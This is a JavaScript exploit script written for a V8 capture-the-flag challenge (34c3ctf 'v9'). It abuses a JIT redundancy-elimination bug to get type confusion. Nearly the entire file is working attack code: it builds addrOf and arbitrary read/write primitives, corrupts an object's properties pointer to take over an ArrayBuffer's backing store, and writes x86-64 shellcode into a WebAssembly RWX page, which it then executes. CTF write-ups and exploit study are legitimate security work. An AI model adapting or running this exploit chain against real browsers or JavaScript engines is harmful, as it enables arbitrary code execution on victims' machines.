/**************************************************************
 * File Name: exp.js
 * Created on: 2020-01-07 03:34:23
 * Author: raycp
 * 
 * Last Modified: 2020-01-07 22:43:08
 * Description: exp for v9 in 34c3ctf, bug in redundancy-elimination
************************************************************/
const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                                print(utf8ToString(h, index));
                            
            }
                    
        }
            
    };
        var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
                96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
                116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
                131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
                109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
                128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
                65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
        let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
        let h = new Uint8Array(m.exports.memory.buffer);
        return m.exports.hello;
    
}
// wasm obj
func = wasm_func();

// gc function to move data to old space
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

// getPrimitive return [read64, write, addrOf] primitive
function getPrimitive() {
   
    // addrOf fuction with vuln
    // Note: this and the following function only works once, then would have to be recompiled.
    // This is due to the fact that the used Map permanently transitions
    // to a different format once we change the type of the property.
    function addrOf(obj)
    {
        let o = {a: 13.37, b: 14.47};
        
        function triggerReadTypeConfuse(o, callback) {
            var tmp = o.a;
            callback();
            return o.b;
        }
        function evil() {
            o.b = obj
        }
        for(let i=0; i<100000; i++) {
            triggerReadTypeConfuse(o, ()=>1);
            triggerReadTypeConfuse(o, ()=>2);
            triggerReadTypeConfuse(o, ()=>3);
        }
    
    // %DebugPrint(o);
    // %DebugPrint(obj);
    // %SystemBreak();
        let addr = f2i(triggerReadTypeConfuse(o, evil));
    // %DebugPrint(o);
    // %DebugPrint(obj);
    // %SystemBreak();
        return addr;

    }

    // corrupt_properties_pointer of given target to value
    // change the properties to jsObject, which's properties pointer is in the same position of HeapNumber
    function corrupt_properties_pointer(target, value) {
        function hax(o, cb) {
            var a = o.c;
            cb(a);
            o.d = value;  // 3. change the target obj's properties pointer to value 
            return o.d;
        }

        var o = {c: 1};
        // Added properties are stored as HeapNumber right away (as opposed to unboxed double).
        o.d = 13.37; // 1. properties[0] is MutableNumber here

        for (var i = 0; i < 100000; i++) {
            hax(o, function(a) { return a + i; });
        }
        
        var o = {c: 0};
        o.d = 13.37;
        // %DebugPrint(target);
        // %DebugPrint(o);
        // %SystemBreak();
        var r = hax(o, function() {
            o.d = target;  // 2. change properties[0] from MutableNumber to target obj
         //%DebugPrint(target);
         //%DebugPrint(o);
         //%SystemBreak();
        });
    }

    var memviewBuf = new ArrayBuffer(1024);
    var driverBuf = new ArrayBuffer(1024);

    // Must trigger GC now so driver_buf is promoted to old space and is not moved around anymore (which would invalidate our leaked address).
    gc();
    
    var bufAddr = addrOf(driverBuf);

    var victim = {inline: 42};
    // Force out-of-line storage
    victim.offset0  = {};
    victim.offset8  = {};
    victim.offset16 = {};
    // Corrupt the victim object and have its properties array
    // point to our ArrayBuffer object.
    corrupt_properties_pointer(victim, i2f(bufAddr));

    // change the driverBuf backing_store point to memviewBuf
    victim.offset16 = memviewBuf;
    var driver = new DataView(driverBuf);
    // then form the primitives with memviewBuf backing_store.
    return {
        write(addr, payload){
            driver.setFloat64(31, i2f(addr), true);
            var memView = new DataView(memviewBuf);
            for(let i=0; i<payload.length; i++) {
                memView.setUint8(i, payload[i]);    
            }
        },
        read64(addr) {
            //%DebugPrint(memviewBuf);
            //%SystemBreak();
            driver.setFloat64(31, i2f(addr), true);
            //%SystemBreak();
            var memView = new DataView(memviewBuf);
            return f2i(memView.getFloat64(0, true));
        },
        addrOf(obj) {
            driverBuf.leakobj = obj;
            let propertiesAddr = this.read64(bufAddr+0x7);
            let objAddr = this.read64(propertiesAddr+0xf) -1 ;
            return objAddr;
        },
        // get wasm obj with map's instanceDescriptors
        addrOfWasmObj(obj) {
            //%DebugPrint(driverBuf);
            driverBuf.leakobj = obj;
            //%DebugPrint(driverBuf.leakobj);
            //%DebugPrint(driverBuf.backing_store);
            let mapAddr = this.read64(bufAddr-1);
            let instanceDescriptorsAddr = this.read64(mapAddr+0x2f);
            //%DebugPrint(driverBuf);
            //console.log(hex(instanceDescriptorsAddr));
            //%SystemBreak();
            let objAddr = this.read64(instanceDescriptorsAddr+0x2f);
            return objAddr;
        },
    };
}

function pwn()
{
    // step 1, form the primitive
    var primitive = getPrimitive();

    // step 2, leaked rwx addr of wasm obj
    //%DebugPrint(func);
    var wasmObjAddr = primitive.addrOfWasmObj(func);
    console.log("wasm function addr: 0x"+hex(wasmObjAddr));
    var rwxAddr = primitive.read64(wasmObjAddr+0x37)+0x5f;
    console.log("rwx addr: 0x"+hex(rwxAddr));
    
    // step 3, overwrite shellcdoe to rwx addr
	var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    	96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    	105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    	72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    	72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    	184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    	94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
   	primitive.write(rwxAddr, shellcode);
    //console.log(hex(primitive.addrOf(shellcode)));
    //%DebugPrint(shellcode);
    // trigger shellcode to execute arbitrary code.
    func();
}

pwn();

